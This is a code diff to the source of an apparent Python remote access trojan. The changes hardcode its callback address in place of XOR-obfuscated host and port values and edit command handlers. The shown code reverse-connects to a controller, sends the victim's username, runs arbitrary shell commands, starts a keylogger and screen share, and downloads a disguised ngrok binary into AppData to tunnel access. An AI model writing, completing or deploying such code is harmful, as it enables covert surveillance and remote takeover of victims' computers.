@@ -731,11 +731,11 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            port = xor_strings($lport, $portkey).decode('utf8')
-            host = xor_strings($lhost, $hostkey).decode('utf8')
-            s.connect((host,int(port)))
+            #port = xor_strings($lport, $portkey).decode('utf8')
+            #host = xor_strings($lhost, $hostkey).decode('utf8')
+            s.connect(('127.0.0.1',int(4444)))
 
-            s.send('$key'.encode()+":".encode()+getpass.getuser().encode())
+            s.send('youhacker'.encode()+":".encode()+getpass.getuser().encode())
 
             shell()
             s.close()
@@ -863,11 +863,14 @@ def shell():
                     stopscreenshare()
                 elif command[:5] == 'start':
                     try:
+                        reliable_send('[*] Executing')
                         subprocess.Popen(command[6:], shell=True)
-                        reliable_send('\n [+] started \n')
+
                     except:
                         reliable_send('\n [-] Failed \n')
                         continue
+                    else:
+                        reliable_send('[+] Started')
                 elif command[:12] == 'keylog_start':
                     try:
                         global t
@@ -940,6 +943,12 @@ def shell():
                 elif command == 'ngroksetup':
 
                     download_file(appd + '\\systemsoft.exe')
+                    try:
+                        os.system(appd + '\\systemsoft.exe authtoken '+s.recv(1024).decode())
+                    except:
+                        s.send("[-] Error Adding your token".encode())
+                    else:
+                        s.send('[+] Ngrok Token Inputted'.encode())
                 elif command[:7] == 'sysinfo':
                     try:
                         sysinfo()
@@ -967,6 +976,7 @@ def shell():
 
                         os.startfile(sys.executable)
                         sys.exit()
+
                 else:
 
                     execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
